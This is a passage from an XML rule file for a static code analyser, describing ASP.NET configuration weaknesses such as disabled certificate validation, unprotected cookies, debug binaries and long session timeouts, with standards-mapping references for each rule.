																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[13] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_certificate_validation_disabled</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Certificate Validation Disabled</internalKey>
    <name>ASP.NET Misconfiguration: Certificate Validation Disabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Certificates that are self-issued might not be trustworthy.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Programs can be configured to validate X.509 certificates in one of three ways. By default, certificates are validated through their chain of trust back to a trusted root authority. This setting is known as <code>ChainTrust</code> and provides the maximum level of assurance that the certificate is valid. By default all certificates are validated using <code>ChainTrust</code>.<br><br>To make use of a certificate that was not issued by a trusted root authority, a program can be configured to trust certificates issued by its peers by setting either <code>PeerTrust</code> or <code>PeerOrChainTrust</code>. These settings should not be used in production environments because they significantly reduce the level of security granted by certificates.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3305 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3305 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3305 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3305 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3305 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 296</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-17 Public Key Infrastructure Certificates (P1)</em> <br></p>
																									   <p>[18] Microsoft Corporation <em>Working with Certificates</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_cookie_protection_disabled</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Cookie Protection Disabled</internalKey>
    <name>ASP.NET Misconfiguration: Cookie Protection Disabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The contents of unprotected cookies could be viewed or modified by attackers.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cookies are often used to store important information about users, such as personal information, authentication tokens and a history of their activity. If this information is stored in plaintext, anyone with access to machines used to interact with the application will have access to the information stored in the cookie. Worse yet, if attackers are allowed to arbitrarily modify the data stored in cookies, they can falsify information provided to the application and potentially alter its behavior to their advantage.<br><br>In many cases, an application can validate input from cookies programmatically according to the context in which it is used, but the ASP.NET validation framework provides an excellent way to both protect the contents of the cookie and to verify that the cookie has not been modified unexpectedly. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>.NET Framework General Reference: forms Element</em> Microsoft Corporation<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 565</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_cross_site_scripting_protection</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Cross-Site Scripting Protection</internalKey>
    <name>ASP.NET Misconfiguration: Cross-Site Scripting Protection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The X-XSS-Protection header is explicitly disabled which may increase the risk of cross-site scripting attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  X-XSS-Protection refers to a header that is automatically enabled in IE8 and greater.  When the header value is set to false (0) cross-site scripting protection is disabled.<br><br>The header can be set in multiple locations and should be checked for both misconfiguration as well as malicious tampering.<br>        
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10]  <em>Configuring Services Using Configuration Files</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 554</em> <br></p>
																									   <p>[12]  <em>How to prevent cross-site scripting security issues</em> <br></p>
																									   <p>[13]  <em>HOW TO: Disable the Documentation Protocol for ASP.NET Web Services</em> <br></p>
																									   <p>[14]  <em>HttpResponse.AppendHeader Method</em> <br></p>
																									   <p>[15]  <em>IE8 Security Part IV: The XSS Filter</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[17]  <em>OWASP: List of useful HTTP headers</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[23]  <em>The XSS Filter in Internet Explorer 8 improperly blocks HTTP response rendered as XML</em> <br></p>
																									   <p>[24]  <em>What's New in Internet Explorer 8</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_debug_information</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Debug Information</internalKey>
    <name>ASP.NET Misconfiguration: Debug Information</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Debugging messages help attackers learn about the system and plan a form of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. The <code>debug</code> attribute of the <code>&lt;compilation&gt;</code> tag defines whether compiled binaries should include debugging information.<br><br>The use of debug binaries causes an application to provide as much information about itself as possible to the user. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production. Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II, APP3620 CAT II</em> <br></p>
																									   <p>[10]  <em>ASP.Net Settings Schema: <compilation> Element</em> Microsoft<br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 11</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_excessive_session_timeout</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Excessive Session Timeout</internalKey>
    <name>ASP.NET Misconfiguration: Excessive Session Timeout</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An overly long authentication timeout gives attackers more time to potentially compromise user accounts.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The longer a session stays open, the larger the window of opportunity an attacker has to compromise user accounts. While a session remains active, an attacker may be able to brute force a user's password, crack a user's wireless encryption key, or commandeer a session from an open browser. Longer authentication timeouts can also prevent memory from being released and eventually result in a denial of service if a sufficiently large number of sessions are created.<br><br><b>Example 1:</b> The following example shows ASP.NET MVC configured with an hour authentication timeout.<br><pre><br>...<br>&lt;configuration&gt;<br>  &lt;system.web&gt;<br>  &lt;authentication&gt;<br>    &lt;forms<br>      timeout="60" /&gt;<br>  &lt;/authentication&gt;<br>  &lt;/system.web&gt;<br>&lt;/configuration&gt;<br>...<br></pre><br><br>If the timeout attribute is not specified the authentication timeout defaults to 30 minutes.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-12 Session Termination (P2)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3415 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3415 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3415 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3415 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3415 CAT II</em> <br></p>
																									   <p>[11] MSDN <em>ASP.NET Session State</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 613</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Session Expiration</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10, Requirement 8.1.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3, Requirement 8.5.15</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7, Requirement 8.5.15</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 8.5.15</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_incomplete_certificate_validation</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Incomplete Certificate Validation</internalKey>
    <name>ASP.NET Misconfiguration: Incomplete Certificate Validation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Certificates that are self-issued might not be trustworthy.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Programs can be configured to validate X.509 certificates in one of three ways. By default, certificates are validated through their chain of trust back to a trusted root authority. This setting is known as <code>ChainTrust</code> and provides the maximum level of assurance that the certificate is valid. By default all certificates are validated using <code>ChainTrust</code>.<br><br>To make use of a certificate that was not issued by a trusted root authority, a program can be configured to trust certificates issued by its peers by setting either <code>PeerTrust</code> or <code>PeerOrChainTrust</code>. These settings should not be used in production environments because they significantly reduce the level of security granted by certificates.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3305 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3305 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3305 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3305 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3305 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 296</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-17 Public Key Infrastructure Certificates (P1)</em> <br></p>
																									   <p>[16] Microsoft Corporation <em>Working with Certificates</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_incomplete_cookie_protection</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Incomplete Cookie Protection</internalKey>
    <name>ASP.NET Misconfiguration: Incomplete Cookie Protection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The contents of unprotected cookies could be viewed or modified by attackers.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cookies are often used to store important information about users, such as personal information, authentication tokens and a history of their activity. If this information is stored in plaintext, anyone with access to machines used to interact with the application will have access to the information stored in the cookie. Worse yet, if attackers are allowed to arbitrarily modify the data stored in cookies, they can falsify information provided to the application and potentially alter its behavior to their advantage.<br><br>In many cases, an application can validate input from cookies programmatically according to the context in which it is used, but the ASP.NET validation framework provides an excellent way to both protect the contents of the cookie and to verify that the cookie has not been modified unexpectedly. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>.NET Framework General Reference: forms Element</em> Microsoft Corporation<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 565</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>MP, SC</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_incomplete_role_protection</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Incomplete Role Protection</internalKey>
    <name>ASP.NET Misconfiguration: Incomplete Role Protection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unprotected role information in cookies can be viewed or modified by attackers.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If the <code>cacheRolesInCookie</code> attribute of the <code>configuration/system.web/authentication/forms</code> element in <code>web.config</code> is set to <code>true</code>, then the roles for each user are cached in a cookie. If this information is stored in plaintext, anyone with access to machines used to interact with the application will have access to the information stored in the cookie. Worse yet, if attackers are allowed to arbitrarily modify the data stored in cookies, they can falsify information provided to the application and potentially alter its behavior to their advantage.<br><br>In many cases, an application can validate input from cookies programmatically according to the context in which it is used, but the ASP.NET validation framework provides an excellent way to verify that the cookie has not been modified unexpectedly. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>.NET Framework General Reference: CookieProtectionValue Property</em> Microsoft Corporation<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 302</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>MP, SC</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_information_disclosure</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Information Disclosure</internalKey>
    <name>ASP.NET Misconfiguration: Information Disclosure</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The Documentation Protocol for ASP.NET Web Services is enabled which may disclose information on how to misuse the service.
							</p>
							<h2>EXPLANATION</h2>
							<p>
